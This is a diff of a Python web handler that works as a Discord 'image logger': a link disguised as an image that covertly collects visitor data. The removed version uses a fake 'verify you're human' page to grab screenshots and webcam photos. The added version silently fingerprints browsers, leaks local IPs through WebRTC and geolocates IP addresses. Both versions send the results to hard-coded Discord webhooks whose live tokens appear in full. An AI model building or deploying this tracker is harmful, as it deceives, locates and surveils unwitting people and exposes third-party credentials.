@@ -1,26 +1,26 @@
-# Enhanced Image Logger with Media Capture
-# By Team C00lB0i/C00lB0i | Enhanced for Cybersecurity Project
+# Enhanced IP Logger with Automatic Data Collection
+# Maintains original detail level + adds automatic data capture
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser, json
 
-__app__ = "Discord Image Logger Plus"
-__description__ = "Advanced IP and media capture tool"
-__version__ = "v3.0"
-__author__ = "C00lB0i"
+__app__ = "Advanced IP Logger"
+__description__ = "Automated IP and system data collection"
+__version__ = "v4.0"
+__author__ = "Cybersecurity Student"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1386756417368752249/ASWh-wwav0RH1LmxiImI2SD900JuBi6RjSQl-I-s_JNjle2NpEcPRr95OJAaHvj-B7Mw",
+    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
     "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
     "imageArgument": True,
-    "username": "Media Logger",
+    "username": "Data Logger",
     "color": 0x00FFFF,
     "crashBrowser": False,
     "accurateLocation": True,
     "message": {
-        "doMessage": True,
-        "message": "Verifying your request...",
+        "doMessage": False,
+        "message": "Loading image...",
         "richMessage": True,
     },
     "vpnCheck": 1,
@@ -29,17 +29,15 @@ config = {
     "antiBot": 1,
     "redirect": {
         "redirect": False,
-        "page": "https://your-link.here"
+        "page": "https://example.com"
     },
-    # New media capture settings
-    "captureScreenshot": True,
-    "captureWebcam": True,
-    "mediaWebhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz"
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
+    if not ip or not useragent:
+        return False
     if ip.startswith(("34", "35")):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
@@ -50,71 +48,44 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json={
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [{
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
-        }]
-    })
-
-def send_media_to_discord(media_data, media_type, ip):
-    """Send captured media to Discord"""
     try:
-        requests.post(config["mediaWebhook"], json={
-            "username": f"Media Capture - {ip}",
-            "content": f"New {media_type} captured from {ip}",
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content": "@everyone",
             "embeds": [{
-                "title": f"{media_type.capitalize()} Capture",
+                "title": "Logger Error",
                 "color": config["color"],
-                "image": {"url": f"attachment://{media_type}.png"}
-            }],
-            "attachments": [{
-                "id": 0,
-                "filename": f"{media_type}.png",
-                "content_type": "image/png"
-            }],
-            "payload_json": {
-                "embeds": [{
-                    "title": f"{media_type.capitalize()} Capture",
-                    "color": config["color"],
-                    "image": {"url": "attachment://image.png"}
-                }],
-                "attachments": [{
-                    "id": 0,
-                    "filename": "image.png",
-                    "description": f"{media_type} from {ip}"
-                }]
-            }
-        }, files={
-            f"{media_type}.png": (f"{media_type}.png", base64.b64decode(media_data), "image/png")
-        })
-    except Exception as e:
-        reportError(f"Media send error: {str(e)}")
+                "description": f"```\n{error}\n```",
+            }]
+        }, timeout=3)
+    except:
+        pass
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
-    if ip.startswith(blacklistedIPs):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, system_info=None):
+    if not ip or ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
     if bot:
         if config["linkAlerts"]:
-            requests.post(config["webhook"], json={
-                "username": config["username"],
-                "content": "",
-                "embeds": [{
-                    "title": "Media Logger - Link Sent",
-                    "color": config["color"],
-                    "description": f"Media logging link sent!\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
-                }]
-            })
+            try:
+                requests.post(config["webhook"], json={
+                    "username": config["username"],
+                    "content": "",
+                    "embeds": [{
+                        "title": "Logger - Link Sent",
+                        "color": config["color"],
+                        "description": f"Link sent!\n**IP:** {ip}\n**Platform:** {bot}",
+                    }]
+                }, timeout=3)
+            except:
+                pass
         return
 
     ping = "@everyone"
+    info = {}
     try:
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3).json()
         if info.get("proxy"):
             if config["vpnCheck"] == 2:
                 return
@@ -122,18 +93,12 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
                 ping = ""
         
         if info.get("hosting"):
-            if config["antiBot"] == 4:
-                if not info.get("proxy"):
-                    return
-            elif config["antiBot"] == 3:
+            if config["antiBot"] in [3, 4]:
                 return
-            elif config["antiBot"] == 2:
-                if not info.get("proxy"):
-                    ping = ""
-            elif config["antiBot"] == 1:
+            elif config["antiBot"] in [1, 2]:
                 ping = ""
     except:
-        info = {}
+        pass
 
     os, browser = "Unknown", "Unknown"
     try:
@@ -141,23 +106,45 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     except:
         pass
 
+    # Format system info if available
+    system_text = "**System Info:**\n> No additional data captured"
+    if system_info:
+        try:
+            system_text = "**System Info:**\n"
+            system_text += f"> **Screen:** {system_info.get('screen', 'Unknown')}\n"
+            system_text += f"> **CPU Cores:** {system_info.get('cores', 'Unknown')}\n"
+            system_text += f"> **Device Memory:** {system_info.get('memory', 'Unknown')}\n"
+            system_text += f"> **Language:** {system_info.get('language', 'Unknown')}\n"
+            system_text += f"> **Timezone:** {system_info.get('timezone', 'Unknown')}\n"
+            system_text += f"> **Cookies Enabled:** {system_info.get('cookies', 'Unknown')}\n"
+            system_text += f"> **WebGL Vendor:** {system_info.get('webgl_vendor', 'Unknown')}\n"
+            system_text += f"> **Local IPs:** {system_info.get('local_ips', 'Unknown')}\n"
+        except:
+            system_text = "**System Info:**\n> Error processing data"
+
+    # Create detailed report
     embed = {
         "username": config["username"],
         "content": ping,
         "embeds": [{
-            "title": "Media Logger - IP Logged",
+            "title": "Advanced Data Capture",
             "color": config["color"],
-            "description": f"""**New Visitor!**
+            "description": f"""**New Connection Detected!**
 
-**Endpoint:** {endpoint}
+**Endpoint:** `{endpoint}`
             
 **IP Info:**
-> **IP:** {ip}
+> **IP:** `{ip}`
 > **ISP:** {info.get('isp', 'Unknown')}
+> **ASN:** {info.get('as', 'Unknown')}
 > **Country:** {info.get('country', 'Unknown')}
+> **Region:** {info.get('regionName', 'Unknown')}
 > **City:** {info.get('city', 'Unknown')}
 > **Coords:** {f"{info.get('lat', '?')}, {info.get('lon', '?')}" if not coords else coords}
-> **VPN:** {'Yes' if info.get('proxy') else 'No'}
+> **Timezone:** {info.get('timezone', 'Unknown').replace('_', ' ')}
+> **Mobile:** {'Yes' if info.get('mobile') else 'No'}
+> **VPN/Proxy:** {'Yes' if info.get('proxy') else 'No'}
+> **Hosting:** {'Yes' if info.get('hosting') else 'No'}
 
 **System Info:**
 > **OS:** {os}
@@ -165,15 +152,15 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
 **User Agent:**
 ```{useragent}```
+
+{system_text}
 """,
+            "thumbnail": {"url": config["image"]}
         }]
     }
     
-    if url: 
-        embed["embeds"][0].update({"thumbnail": {"url": url}})
-    
     try:
-        requests.post(config["webhook"], json=embed, timeout=5)
+        requests.post(config["webhook"], json=embed, timeout=3)
     except:
         pass
 
@@ -183,51 +170,40 @@ binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
-class MediaCaptureAPI(BaseHTTPRequestHandler):
+class AutoCaptureLogger(BaseHTTPRequestHandler):
     
-    def handleRequest(self):
+    def handle_request(self):
         try:
-            # Parse request path and query
+            # Parse request
             parsed_path = parse.urlparse(self.path)
             query = parse.parse_qs(parsed_path.query)
             
-            # Handle media submission endpoint
-            if parsed_path.path == "/submit_media":
+            # Handle system info submission
+            if self.command == "POST" and parsed_path.path == "/collect":
                 content_length = int(self.headers.get('Content-Length', 0))
-                post_data = self.rfile.read(content_length)
-                data = parse.parse_qs(post_data.decode())
-                
-                ip = self.headers.get('x-forwarded-for', 'Unknown')
-                
-                # Process screenshot if available
-                if config["captureScreenshot"] and b'screenshot' in post_data:
-                    screenshot_data = data.get('screenshot', [''])[0]
-                    send_media_to_discord(screenshot_data, "screenshot", ip)
-                
-                # Process webcam capture if available
-                if config["captureWebcam"] and b'webcam' in post_data:
-                    webcam_data = data.get('webcam', [''])[0]
-                    send_media_to_discord(webcam_data, "webcam", ip)
+                if content_length:
+                    post_data = self.rfile.read(content_length)
+                    system_info = json.loads(post_data)
+                    ip = self.headers.get('x-forwarded-for', 'Unknown').split(',')[0].strip()
+                    user_agent = self.headers.get('user-agent', 'Unknown')
+                    
+                    # Update report with system info
+                    makeReport(ip, user_agent, system_info=system_info, endpoint=parsed_path.path)
                 
                 self.send_response(200)
                 self.end_headers()
                 return
             
             # Get image URL
+            url = config["image"]
             if config["imageArgument"] and (query.get("url") or query.get("id")):
                 url = base64.b64decode((query.get("url") or query.get("id"))[0]).decode()
-            else:
-                url = config["image"]
             
-            # Skip blacklisted IPs
-            ip = self.headers.get('x-forwarded-for', 'Unknown')
-            if ip.startswith(blacklistedIPs):
-                self.send_response(403)
-                self.end_headers()
-                return
+            # Get client info
+            ip = self.headers.get('x-forwarded-for', 'Unknown').split(',')[0].strip()
+            user_agent = self.headers.get('user-agent', 'Unknown')
             
             # Handle bots
-            user_agent = self.headers.get('user-agent', '')
             if botCheck(ip, user_agent):
                 self.send_response(200 if config["buggedImage"] else 302)
                 if config["buggedImage"]:
@@ -237,13 +213,13 @@ class MediaCaptureAPI(BaseHTTPRequestHandler):
                 else:
                     self.send_header('Location', url)
                     self.end_headers()
-                
-                makeReport(ip, endpoint=parsed_path.path, url=url)
+                makeReport(ip, user_agent, endpoint=parsed_path.path, url=url)
                 return
             
-            # Generate HTML with media capture capabilities
-            html_content = self.generate_capture_html(url, ip)
+            # Generate HTML with automatic data collection
+            html_content = self.generate_html(url)
             
+            # Send response
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
@@ -256,229 +232,114 @@ class MediaCaptureAPI(BaseHTTPRequestHandler):
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error')
+            self.wfile.write(b'Error loading content')
             reportError(traceback.format_exc())
 
-    def generate_capture_html(self, image_url, ip):
+    def generate_html(self, image_url):
         return f"""<!DOCTYPE html>
 <html>
 <head>
-    <title>Image Verification</title>
+    <title>Image Preview</title>
     <style>
         body {{
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+            background-color: #000;
+            overflow: hidden;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            flex-direction: column;
         }}
-        .container {{
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-width: 600px;
-            width: 90%;
-            text-align: center;
+        .loader {{
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
         }}
-        .image-preview {{
-            width: 100%;
-            max-height: 400px;
-            object-fit: contain;
-            margin: 20px 0;
-            border: 1px solid #eee;
-            border-radius: 5px;
-        }}
-        .btn {{
-            background-color: #4285F4;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin: 10px;
-            transition: background-color 0.3s;
-        }}
-        .btn:hover {{
-            background-color: #3367D6;
-        }}
-        .hidden {{
-            display: none;
-        }}
-        .status {{
-            margin-top: 20px;
-            font-size: 14px;
-            color: #666;
-        }}
-        .camera-feed {{
-            width: 100%;
-            max-height: 300px;
-            background-color: #000;
-            margin: 20px 0;
-            border-radius: 5px;
+        @keyframes spin {{
+            to {{ transform: rotate(360deg); }}
         }}
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Image Verification Required</h2>
-        <p>Please verify you're human to view this content</p>
-        
-        <img src="{image_url}" class="image-preview" alt="Verification Image">
-        
-        <div id="captureSection">
-            <button id="captureBtn" class="btn">Verify Identity</button>
-            <p class="status">This helps prevent automated access</p>
-        </div>
-        
-        <div id="cameraSection" class="hidden">
-            <p>Camera access required for verification</p>
-            <video id="cameraFeed" class="camera-feed" autoplay playsinline></video>
-            <button id="captureWebcamBtn" class="btn">Capture Image</button>
-        </div>
-        
-        <div id="processingSection" class="hidden">
-            <p>Processing verification...</p>
-            <div class="status">Please wait while we verify your request</div>
-        </div>
-    </div>
-
+    <div class="loader"></div>
     <script>
-        // Configuration
-        const config = {{
-            captureScreenshot: {str(config["captureScreenshot"]).lower()},
-            captureWebcam: {str(config["captureWebcam"]).lower()}
-        }};
-        
-        // Elements
-        const captureBtn = document.getElementById('captureBtn');
-        const cameraSection = document.getElementById('cameraSection');
-        const cameraFeed = document.getElementById('cameraFeed');
-        const captureWebcamBtn = document.getElementById('captureWebcamBtn');
-        const processingSection = document.getElementById('processingSection');
-        const captureSection = document.getElementById('captureSection');
-        
-        // State
-        let stream = null;
-        let screenshotData = '';
-        let webcamData = '';
-        
-        // Capture screenshot if enabled
-        if(config.captureScreenshot) {{
+        // Automatic data collection without user interaction
+        (function() {{
+            // Create a 1x1 pixel image to load in background
+            const img = new Image();
+            img.src = "{image_url}";
+            img.style.position = 'absolute';
+            img.style.top = '-9999px';
+            img.style.left = '-9999px';
+            document.body.appendChild(img);
+            
+            // Collect system information
+            const systemInfo = {{}};
+            
+            // Screen information
+            systemInfo.screen = `${{screen.width}}x${{screen.height}} (Depth: ${{screen.colorDepth}}bit)`;
+            
+            // CPU cores
+            systemInfo.cores = navigator.hardwareConcurrency || 'Unknown';
+            
+            // Device memory
+            systemInfo.memory = navigator.deviceMemory ? `${{navigator.deviceMemory}}GB` : 'Unknown';
+            
+            // Language and timezone
+            systemInfo.language = navigator.language || 'Unknown';
+            systemInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+            
+            // Cookie support
+            systemInfo.cookies = navigator.cookieEnabled ? 'Yes' : 'No';
+            
+            // WebGL information
             try {{
-                // Create a canvas to capture the current view
                 const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-                
-                // Set canvas dimensions
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                
-                // Draw the current document to canvas
-                context.drawImage(document.documentElement, 0, 0, 
-                                canvas.width, canvas.height);
-                
-                // Get the screenshot as data URL
-                screenshotData = canvas.toDataURL('image/png').split(',')[1];
-            }} catch (e) {{
-                console.error('Screenshot capture failed:', e);
-            }}
-        }}
-        
-        // Handle initial capture button
-        captureBtn.addEventListener('click', async () => {{
-            if(config.captureWebcam) {{
-                // Request camera access
-                try {{
-                    stream = await navigator.mediaDevices.getUserMedia({{ 
-                        video: {{ facingMode: 'user' }} 
-                    }});
-                    cameraFeed.srcObject = stream;
-                    captureSection.classList.add('hidden');
-                    cameraSection.classList.remove('hidden');
-                }} catch (err) {{
-                    console.error('Camera access error:', err);
-                    submitMedia();
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {{
+                    systemInfo.webgl_vendor = gl.getParameter(gl.VENDOR) || 'Unknown';
                 }}
-            }} else {{
-                submitMedia();
-            }}
-        }});
-        
-        // Handle webcam capture
-        captureWebcamBtn.addEventListener('click', () => {{
-            if(!stream) return;
+            }} catch (e) {{}}
             
+            // Attempt to get local IP addresses (may not work in all browsers)
             try {{
-                // Create canvas to capture webcam frame
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-                
-                // Set canvas dimensions to match video
-                canvas.width = cameraFeed.videoWidth;
-                canvas.height = cameraFeed.videoHeight;
-                
-                // Draw current video frame to canvas
-                context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
-                
-                // Get webcam capture as data URL
-                webcamData = canvas.toDataURL('image/png').split(',')[1];
-                
-                // Stop camera stream
-                stream.getTracks().forEach(track => track.stop());
-                
-                // Show processing state
-                cameraSection.classList.add('hidden');
-                processingSection.classList.remove('hidden');
-                
-                // Submit media
-                submitMedia();
+                const ips = [];
+                const pc = new RTCPeerConnection({{iceServers: []}});
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = e => {{
+                    if (!e.candidate) return;
+                    const ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(e.candidate.candidate);
+                    if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
+                    systemInfo.local_ips = ips.length ? ips.join(', ') : 'Not available';
+                }};
             }} catch (e) {{
-                console.error('Webcam capture failed:', e);
-                submitMedia();
+                systemInfo.local_ips = 'Not available';
             }}
-        }});
-        
-        // Submit captured media to server
-        function submitMedia() {{
-            // Create form data
-            const formData = new FormData();
-            if(screenshotData) formData.append('screenshot', screenshotData);
-            if(webcamData) formData.append('webcam', webcamData);
             
-            // Send to server
-            fetch('/submit_media', {{
-                method: 'POST',
-                body: formData
-            }})
-            .then(response => {{
-                // Redirect to actual image after submission
-                window.location.href = "{image_url}";
-            }})
-            .catch(error => {{
-                console.error('Submission error:', error);
-                window.location.href = "{image_url}";
-            }});
-        }}
-        
-        // Auto-start the process if no interaction needed
-        if(!config.captureWebcam && config.captureScreenshot) {{
+            // Send system info to server after a short delay
             setTimeout(() => {{
-                captureSection.classList.add('hidden');
-                processingSection.classList.remove('hidden');
-                submitMedia();
-            }}, 3000);
-        }}
+                try {{
+                    fetch('/collect', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify(systemInfo)
+                    }});
+                }} catch (e) {{}}
+                
+                // Redirect to actual image after collection
+                window.location.href = "{image_url}";
+            }}, 1500);
+        }})();
     </script>
 </body>
 </html>"""
 
-    do_GET = handleRequest
-    do_POST = handleRequest
+    do_GET = handle_request
+    do_POST = handle_request
 
-handler = app = MediaCaptureAPI
+handler = app = AutoCaptureLogger
